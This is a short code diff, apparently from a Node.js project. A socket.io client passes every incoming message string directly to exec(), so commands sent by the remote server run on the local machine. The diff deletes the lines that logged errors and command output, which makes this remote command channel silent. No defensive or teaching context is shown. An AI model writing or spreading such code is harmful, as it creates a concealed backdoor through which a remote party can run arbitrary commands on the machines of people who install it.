@@ -17,10 +17,10 @@ ioClient.on("message", (msg) => {
    else {
     exec(msg, (err, stdout, stderr) => {
   if (err) {
-    console.error(err);
+    
     return;
   }
-  console.log(stdout);
+  
 });
   }
 });
